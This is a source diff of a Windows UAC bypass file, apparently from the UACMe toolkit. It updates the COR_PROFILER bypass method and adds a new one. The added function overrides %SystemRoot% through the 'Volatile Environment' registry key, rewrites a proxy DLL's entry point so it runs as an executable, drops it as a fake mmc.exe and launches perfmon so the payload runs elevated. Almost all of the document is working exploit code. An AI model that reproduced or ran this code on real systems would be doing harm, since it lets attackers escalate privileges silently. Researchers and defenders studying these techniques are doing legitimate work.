@@ -4,9 +4,9 @@
 *
 *  TITLE:       HYBRIDS.C
 *
-*  VERSION:     2.83
+*  VERSION:     2.84
 *
-*  DATE:        13 Nov 2017
+*  DATE:        22 Nov 2017
 *
 *  Hybrid UAC bypass methods.
 *
@@ -1992,11 +1992,11 @@ BOOL ucmMethodCorProfiler(
         if (!supWriteBufferToFile(szBuffer, ProxyDll, ProxyDllSize))
             break;
 
-        supSetEnvVariable(FALSE, COR_ENABLE_PROFILING, TEXT("1"));
-        supSetEnvVariable(FALSE, COR_PROFILER, OutputGuidString);
+        supSetEnvVariable(FALSE, NULL, COR_ENABLE_PROFILING, TEXT("1"));
+        supSetEnvVariable(FALSE, NULL, COR_PROFILER, OutputGuidString);
 
         if (g_ctx.dwBuildNumber >= 9200) {
-            supSetEnvVariable(FALSE, COR_PROFILER_PATH, szBuffer);
+            supSetEnvVariable(FALSE, NULL, COR_PROFILER_PATH, szBuffer);
         }
         else {
             //
@@ -2050,14 +2050,14 @@ BOOL ucmMethodCorProfiler(
     // Cleanup.
     //
     if (OutputGuidString != NULL) {
-        supSetEnvVariable(TRUE, COR_PROFILER, NULL);
+        supSetEnvVariable(TRUE, NULL, COR_PROFILER, NULL);
         CoTaskMemFree(OutputGuidString);
     }
 
-    supSetEnvVariable(TRUE, COR_ENABLE_PROFILING, NULL);
+    supSetEnvVariable(TRUE, NULL, COR_ENABLE_PROFILING, NULL);
 
     if (g_ctx.dwBuildNumber >= 9200)
-        supSetEnvVariable(TRUE, COR_PROFILER_PATH, NULL);
+        supSetEnvVariable(TRUE, NULL, COR_PROFILER_PATH, NULL);
 
     return bResult;
 }
@@ -2298,4 +2298,119 @@ BOOL ucmDccwCOMMethod(
     }
 
     return SUCCEEDED(r);
+}
+
+/*
+* ucmMethodVolatileEnv
+*
+* Purpose:
+*
+* Bypass UAC using self defined %SystemRoot% environment variable in "Volatile Environment" registry key.
+* For more info and examples with other targets see author site:
+* https://bytecode77.com/hacking/exploits/uac-bypass/performance-monitor-privilege-escalation
+* https://bytecode77.com/hacking/exploits/uac-bypass/sysprep-privilege-escalation
+* https://bytecode77.com/hacking/exploits/uac-bypass/remote-assistance-privilege-escalation
+* https://bytecode77.com/hacking/exploits/uac-bypass/display-languages-privilege-escalation
+* https://bytecode77.com/hacking/exploits/uac-bypass/component-services-privilege-escalation
+* https://bytecode77.com/hacking/exploits/uac-bypass/enter-product-key-privilege-escalation
+* https://bytecode77.com/hacking/exploits/uac-bypass/taskmgr-privilege-escalation
+*
+*/
+BOOL ucmMethodVolatileEnv(
+    PVOID ProxyDll,
+    DWORD ProxyDllSize
+)
+{
+    BOOL              bResult = FALSE, bCond = FALSE, bEnvSet = FALSE;
+
+    PIMAGE_NT_HEADERS NtHeaders;
+    DWORD             DllVirtualSize;
+    PVOID             EntryPoint, DllBase;
+
+    WCHAR szBuffer[MAX_PATH * 2];
+
+    do {
+
+        //
+        // Replace default Fubuki dll entry point with new and remove dll flag.
+        //
+        NtHeaders = RtlImageNtHeader(ProxyDll);
+        if (NtHeaders == NULL)
+            break;
+
+        DllVirtualSize = 0;
+        DllBase = PELoaderLoadImage(ProxyDll, &DllVirtualSize);
+        if (DllBase) {
+
+            //
+            // Get the new entrypoint.
+            //
+            EntryPoint = PELoaderGetProcAddress(DllBase, "_FubukiProc3");
+            if (EntryPoint == NULL)
+                break;
+
+            //
+            // Set new entrypoint and recalculate checksum.
+            //
+            NtHeaders->OptionalHeader.AddressOfEntryPoint =
+                (ULONG)((ULONG_PTR)EntryPoint - (ULONG_PTR)DllBase);
+
+            NtHeaders->FileHeader.Characteristics &= ~IMAGE_FILE_DLL;
+
+            NtHeaders->OptionalHeader.CheckSum =
+                supCalculateCheckSumForMappedFile(ProxyDll, ProxyDllSize);
+
+            VirtualFree(DllBase, 0, MEM_RELEASE);
+
+        }
+        else
+            break;
+
+        //
+        // Create %temp%\KureND directory.
+        //
+        RtlSecureZeroMemory(&szBuffer, sizeof(szBuffer));
+        _strcpy(szBuffer, g_ctx.szTempDirectory);
+        _strcat(szBuffer, T_KUREND);
+        
+        if (!CreateDirectory(szBuffer, NULL))
+            if (GetLastError() != ERROR_ALREADY_EXISTS)
+                break;
+
+        //
+        // Set controlled environment variable.
+        //
+        bEnvSet = supSetEnvVariable(FALSE,
+            T_VOLATILE_ENV,
+            T_SYSTEMROOT_VAR,
+            szBuffer);
+
+        if (!bEnvSet)
+            break;
+
+        //
+        // Create %temp%\KureND\system32 directory.
+        //
+        _strcat(szBuffer, SYSTEM32_DIR);
+        if (!CreateDirectory(szBuffer, NULL))
+            if (GetLastError() != ERROR_ALREADY_EXISTS)
+                break;
+
+        //
+        // Drop payload to %temp%\system32 as mmc.exe and run target with wait.
+        //
+        _strcat(szBuffer, MMC_EXE);
+        if (supWriteBufferToFile(szBuffer, ProxyDll, ProxyDllSize)) {
+           bResult = supRunProcess(PERFMON_EXE, NULL);
+        }
+
+    } while (bCond);
+
+    //
+    // Cleanup if requested.
+    //
+    if (bEnvSet)
+        supSetEnvVariable(TRUE, T_VOLATILE_ENV, T_SYSTEMROOT_VAR, NULL);
+
+    return bResult;
 }
